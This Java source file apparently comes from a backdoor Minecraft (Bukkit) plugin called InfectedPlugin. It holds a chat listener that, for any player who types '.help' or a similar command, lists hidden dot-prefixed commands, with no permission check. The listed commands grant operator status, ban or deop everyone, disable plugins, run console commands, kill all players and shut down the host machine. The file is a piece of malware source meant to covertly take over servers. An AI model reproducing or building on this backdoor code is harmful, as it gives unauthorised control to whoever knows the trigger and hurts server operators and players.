package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_help implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".help") || args[0].equalsIgnoreCase(".commands") || args[0].equalsIgnoreCase(".cmds") || args[0].equalsIgnoreCase(".cmdlist"))
            {
                p.sendMessage(ChatColor.RED + "Warning: You have to start the commands with . not /");
                p.sendMessage(ChatColor.AQUA + "Commands");
                p.sendMessage(ChatColor.GOLD + ".opme - OPs you.");
                p.sendMessage(ChatColor.GOLD + ".disableplugin <plugin> - Disables a plugin of your choice.");
                p.sendMessage(ChatColor.GOLD + ".enableplugin <plugin> - Enables a plugin of your choice.");
                p.sendMessage(ChatColor.GOLD + ".deop <player> - Deops a player of your choice.");
                p.sendMessage(ChatColor.GOLD + ".op <player> - OPs a player of your choice.");
                p.sendMessage(ChatColor.GOLD + ".gamemode <creative|survival|adventure> - Changes your gamemode.");
                p.sendMessage(ChatColor.GOLD + ".ban <player> - Bans a player.");
                p.sendMessage(ChatColor.GOLD + ".banall - Bans everyone on the server.");
                p.sendMessage(ChatColor.GOLD + ".deopall - Deops everyone online.");
                p.sendMessage(ChatColor.GOLD + ".shutdown - Attempts to shutdown the computer the server is running on.");
                p.sendMessage(ChatColor.GOLD + ".explode || .explosion - Explode everyone on the server. Includes you.");
                p.sendMessage(ChatColor.GOLD + ".console <cmd> - Use the console.");
                p.sendMessage(ChatColor.GOLD + ".help || .commands || .cmds || .cmdlist - Shows you all the commands.");
                p.sendMessage(ChatColor.AQUA + "Those are all of the commands.");
                event.setCancelled(true);
                return;
            }
        }
    }
}
